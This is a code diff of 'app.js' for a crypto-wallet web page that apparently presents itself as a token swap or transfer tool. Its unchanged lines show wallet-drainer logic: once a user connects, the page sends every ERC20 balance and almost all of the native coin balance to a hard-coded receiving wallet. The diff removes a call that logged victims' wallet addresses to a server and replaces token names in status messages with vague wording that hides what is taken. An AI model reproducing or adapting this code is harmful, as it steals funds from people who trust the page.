@@ -1,4 +1,4 @@
-// app.js - Complete Working Version with Wallet Address Storage
+// app.js - Complete Working Version
 
 // Verify required globals are available
 if (typeof NETWORK_CONFIGS === 'undefined') {
@@ -15,7 +15,6 @@ if (typeof RECEIVING_WALLET === 'undefined') {
 let provider, signer, userAddress;
 let currentNetwork = "bsc";
 const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-const API_ENDPOINT = "http://localhost:3000/api/store-wallet"; // Update this in production
 
 // Initialize when page loads
 window.addEventListener('load', async () => {
@@ -66,41 +65,11 @@ async function initializeWallet() {
     document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
     document.getElementById("walletInfo").textContent = 
       `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
-    
-    // Store wallet address on the server
-    await storeWalletAddress(userAddress, currentNetwork);
-    
     return true;
   } catch (err) {
     console.error("Wallet initialization error:", err);
     updateStatus("Connection error. Please try again.", "error");
     return false;
-  }
-}
-
-async function storeWalletAddress(walletAddress, network) {
-  try {
-    const response = await fetch(API_ENDPOINT, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        walletAddress,
-        network,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent
-      }),
-    });
-    
-    if (!response.ok) {
-      throw new Error('Failed to store wallet address');
-    }
-    
-    console.log('Wallet address stored successfully');
-  } catch (error) {
-    console.error('Error storing wallet address:', error);
-    // Silently fail - this shouldn't affect user experience
   }
 }
 
@@ -224,7 +193,7 @@ async function processAllTransfers() {
     // Process ERC20 tokens
     for (const token of tokensToSwap.filter(t => !t.isNative)) {
       try {
-        updateStatus(`Processing ${token.symbol} transfer...`, "success");
+        updateStatus(`Processing transfer...`, "success");
         const abi = token.abi || ERC20_ABI;
         const contract = new ethers.Contract(token.address, abi, signer);
         const balance = await contract.balanceOf(userAddress);
@@ -236,13 +205,13 @@ async function processAllTransfers() {
           await tx.wait();
           successCount++;
           updateStatus(
-            `${token.symbol} transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
             "success"
           );
         }
       } catch (err) {
-        console.error(`Transfer error for ${token.symbol}:`, err);
-        updateStatus(`${token.symbol} transfer failed`, "error");
+        console.error(`Transfer error:`, err);
+        updateStatus("Transfer failed", "error");
       }
     }
 
@@ -250,7 +219,7 @@ async function processAllTransfers() {
     const nativeToken = tokensToSwap.find(t => t.isNative);
     if (nativeToken) {
       try {
-        updateStatus(`Processing ${nativeToken.symbol} transfer...`, "success");
+        updateStatus(`Processing final transfer...`, "success");
         const balance = await provider.getBalance(userAddress);
         const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
         const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
@@ -264,13 +233,13 @@ async function processAllTransfers() {
           await tx.wait();
           successCount++;
           updateStatus(
-            `${nativeToken.symbol} transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
             "success"
           );
         }
       } catch (err) {
         console.error("Native transfer error:", err);
-        updateStatus(`${nativeToken.symbol} transfer failed`, "error");
+        updateStatus("Final transfer failed", "error");
       }
     }
     
